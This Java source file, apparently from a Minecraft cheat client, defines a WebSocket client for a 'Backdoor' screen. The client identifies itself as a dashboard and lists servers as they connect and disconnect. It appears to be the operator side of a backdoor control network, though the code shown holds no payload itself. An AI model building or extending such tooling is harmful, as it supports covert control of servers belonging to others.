package net.shadow.client.feature.gui.backdoor;

import java.net.URI;

import com.google.gson.*;

import org.java_websocket.client.WebSocketClient;
import org.java_websocket.handshake.ServerHandshake;

public class BackdoorSocket extends WebSocketClient{

    BackdoorScreen callback;

    public BackdoorSocket(URI serverUri, BackdoorScreen callback) {
        super(serverUri);
        this.callback = callback;
    }

    @Override
    public void onOpen(ServerHandshake handshakedata) {
        System.out.println("Authenticating...");
        send("{\"op\":\"identifyDashboard\"}");
    }

    @Override
    public void onMessage(String message) {
        JsonObject msg = JsonParser.parseString(message).getAsJsonObject();
        String opcode = msg.get("op").getAsString();
        switch(opcode){
            case "serverConnect" -> {
                JsonObject dataobj = msg.get("data").getAsJsonObject();
                callback.socketPostMessage(new String[]{dataobj.get("id").getAsString(), dataobj.get("name").getAsString(), dataobj.get("motd").getAsString()}, 0);
            }


            case "serverDisconnect" -> {
                JsonObject dataobj = msg.get("data").getAsJsonObject();
                callback.socketPostMessage(new String[]{dataobj.get("id").getAsString()}, 1);
            }
        }
    }

    @Override
    public void onClose(int code, String reason, boolean remote) {
        // TODO Auto-generated method stub
        
    }

    @Override
    public void onError(Exception ex) {
        // TODO Auto-generated method stub
        
    }
    
}
